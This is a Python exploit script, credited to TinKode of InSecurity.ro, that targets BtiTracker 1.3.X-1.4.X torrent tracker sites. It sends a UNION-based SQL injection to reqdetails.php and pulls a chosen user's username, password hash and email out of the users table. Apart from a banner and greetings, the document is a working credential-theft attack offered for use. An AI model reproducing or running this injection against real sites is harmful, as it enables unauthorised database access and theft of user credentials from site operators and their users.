#!/usr/bin/env python
#
################################################################################
# ______          ____                                      __      [ xpl0it ] #
#/\__  _\        /\  _`\                                 __/\ \__              #
#\/_/\ \/     ___\ \,\L\_\     __    ___   __  __  _ __ /\_\ \ ,_\  __  __     #
#   \ \ \   /' _ `\/_\__ \   /'__`\ /'___\/\ \/\ \/\`'__\/\ \ \ \/ /\ \/\ \    #
#    \_\ \__/\ \/\ \/\ \L\ \/\  __//\ \__/\ \ \_\ \ \ \/ \ \ \ \ \_\ \ \_\ \   #
#    /\_____\ \_\ \_\ `\____\ \____\ \____\\ \____/\ \_\  \ \_\ \__\\/`____ \  #
#    \/_____/\/_/\/_/\/_____/\/____/\/____/ \/___/  \/_/   \/_/\/__/ `/___/> \ #
#                                                   _________________   /\___/ #
#                                                   www.insecurity.ro   \/__/  #
#                                                                              #
################################################################################
#                    [ BtiTracker 1.3.X - 1.4.X Exploit ]                      #
#    Greetz: daemien, Sirgod, Puscas_Marin, AndrewBoy, Ras, HrN, vilches       #
#    Greetz: excess, E.M.I.N.E.M, flo flow, paxnWo, begood, and ISR Staff      #
################################################################################
#                   Because we care, we're security aware                      #
################################################################################

import sys, urllib2, re

if len(sys.argv) < 2:
    print "==============================================================="
    print "============== BtiTracker 1.3.X - 1.4.X Exploit ==============="
    print "==============================================================="
    print "=               Discovered and coded by TinKode               ="
    print "=                     www.InSecurity.ro                       ="
    print "=                                                             ="
    print "= Local Command:                                              ="
    print "= ./isr.py [http://webshit] [ID]                              ="
    print "=                                                             ="
    print "==============================================================="
    exit()

if len(sys.argv) < 3:
    id = 1
else:
    id = sys.argv[2]

shit = sys.argv[1]
if shit[-1:] != "/":
    shit += "/"

url = shit + "reqdetails.php?id=-1337+and+1=0+union+all+select+1,2,3,\
concat(0x2d,0x2d,username,0x3a,password,0x3a,email,0x2d,0x2d)\
,5,6,7,8,9,10+from+users+where+ID=" + str(id) + "--"
print "\n"
print "============================================="
print "================= InSecurity ================"
print "============================================="

html = urllib2.urlopen(url).read()
slobod = re.findall(r"--(.*)\:([0-9a-fA-F]{32})\:(.*)--", html)
if len(slobod) > 0:
    print "ID       : " + str(id)
    print "Username : " + slobod[0][0]
    print "Password : " + slobod[0][1]
    print "EMail    : " + slobod[0][2]
    print "============================================="
    print "================= InSecurity ================"
    print "============================================="
else:
    print "Ai luat-o la gaoaza..."

#InSecurity.ro - Romania